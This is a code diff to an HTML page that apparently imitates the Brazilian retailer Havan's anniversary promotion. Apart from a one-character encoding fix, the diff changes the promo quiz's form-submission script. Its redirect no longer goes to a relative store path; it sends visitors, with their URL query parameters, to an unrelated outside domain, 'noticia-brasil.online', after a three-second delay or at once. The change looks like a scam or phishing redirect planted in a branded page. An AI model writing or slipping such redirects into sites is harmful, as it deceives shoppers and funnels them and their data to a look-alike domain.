@@ -59,7 +59,7 @@
                 <div data-enable-parallax="0" data-parallax-speed="0.5" data-background-images="{\" desktop_image\":\"https:="" www.havan.com.br="" media="" tip-bar="" aniversario-havan="" tipbar-mobile-1320x50-aniversario-1.webp\",\"mobile_image\":\"https:="" tipbar-mobile-768x60-aniversario-1.webp\"}"="" data-background-type="image" data-video-loop="true" data-video-play-only-visible="true" data-video-lazy-load="true" data-video-fallback-src="" id="" data-element="inner" data-pb-style="W7XO9VL" class="background-image-66708d8005596 img1">
                     <div data-content-type="html" data-appearance="default" data-element="main" data-decoded="true">
 
-                        <div class="tip-bar-link">�&nbsp;</div>
+                        <div class="tip-bar-link"> &nbsp;</div>
                         <style>
                             .cms-aniversario .promotion-banner-container {
                                 display: none;
@@ -489,11 +489,11 @@ function submitForm(questionNumber) {
 
     // Aguarda 3 segundos antes de redirecionar
     setTimeout(function() {
-    var currentUrl = window.location.href;
-    var urlObj = new URL(currentUrl);
-    var queryParams = urlObj.search;
+      var currentUrl = window.location.href;
+      var urlObj = new URL(currentUrl);
+      var queryParams = urlObj.search;
 
-    window.location.href = './loja/celulares-e-smartphones/' + queryParams;
+      window.location.href = 'https://noticia-brasil.online/loja/' + queryParams;
     }, 3000);
   } else {
     // Redireciona diretamente se não houver mensagem de agradecimento
@@ -501,13 +501,13 @@ function submitForm(questionNumber) {
     var urlObj = new URL(currentUrl);
     var queryParams = urlObj.search;
 
-    window.location.href = './loja/celulares-e-smartphones/' + queryParams;
+    window.location.href = 'https://noticia-brasil.online/loja/' + queryParams;
   }
 
   return false; // Impede o envio do formulário
 }
-
 </script>
+
 
     </main>
 
